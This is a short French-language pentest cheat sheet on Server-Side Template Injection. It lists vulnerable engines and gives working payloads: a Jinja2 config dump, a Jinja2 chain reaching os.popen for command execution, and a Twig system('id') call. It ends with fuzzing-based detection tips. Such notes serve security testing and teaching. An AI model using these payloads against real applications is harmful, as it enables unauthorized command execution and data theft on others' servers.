# SSTI (Server-Side Template Injection)

## Description
Les vulnérabilités SSTI (Server-Side Template Injection) se produisent lorsqu'une application web utilise des moteurs de templates pour générer dynamiquement des pages et permet l'injection de code malveillant dans les modèles. Cette vulnérabilité peut permettre l'exécution de commandes côté serveur et l'accès non autorisé aux données sensibles.

## Moteurs de template vulnérables
Les moteurs de template souvent affectés par SSTI incluent :
- Jinja2 (Python)
- Thymeleaf (Java)
- Twig (PHP)
- Velocity (Java)

## Exemples d'exploitation

### Jinja2 (Python)
Dans Jinja2, une SSTI peut être exploitée en utilisant une syntaxe de code Python comme suit :  
```
{{ 7 * 7 }}
```

### Exploitation basique
Une injection SSTI simple dans un moteur de template Jinja2 :  
```
{{ config.items() }}
```

### Exécution de commandes système
Pour exécuter une commande système, vous pouvez utiliser :  
```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```

### Exploits spécifiques à chaque moteur
#### Twig (PHP)
Pour obtenir des informations dans Twig :  
```
{{ system('id') }}
```

## Techniques de détection
1. **Fuzzing** : Utilisez des symboles tels que `{{}}`, `{{**}}`, ou `#{}` dans les champs d'entrée.
2. **Payloads basiques** : Essayez des expressions mathématiques simples, comme `{{ 7*7 }}` et vérifiez les réponses.

